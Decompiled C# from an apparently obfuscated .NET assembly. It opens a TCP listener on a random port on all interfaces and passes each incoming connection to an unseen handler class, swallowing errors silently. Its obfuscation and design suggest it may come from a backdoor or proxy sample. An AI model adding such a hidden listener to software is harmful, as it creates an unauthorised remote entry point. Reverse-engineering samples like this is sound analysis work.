using System;
using System.Net;
using System.Net.Sockets;
using ns0;

namespace ns1;

internal class Class3
{
	private static Socket socket_0 = new Socket((AddressFamily)2, (SocketType)1, (ProtocolType)6);

	public static void smethod_0()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		try
		{
			Class2.ushort_0 = (ushort)Class12.H6A.Next(1024, 65000);
			socket_0.Bind((EndPoint)new IPEndPoint(IPAddress.Any, (int)Class2.ushort_0));
			socket_0.Listen(Class2.int_2);
			socket_0.BeginAccept((AsyncCallback)smethod_2, (object)socket_0);
		}
		catch
		{
			smethod_1();
		}
	}

	public static void smethod_1()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			Class2.ushort_0 = 0;
			socket_0.Close();
		}
		catch
		{
		}
	}

	private static void smethod_2(IAsyncResult iasyncResult_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		try
		{
			Socket val = ((Socket)iasyncResult_0.AsyncState).EndAccept(iasyncResult_0);
			if (val != null)
			{
				new Class4(val).method_0();
			}
			((Socket)iasyncResult_0.AsyncState).BeginAccept((AsyncCallback)smethod_2, (object)(Socket)iasyncResult_0.AsyncState);
		}
		catch
		{
		}
	}
}
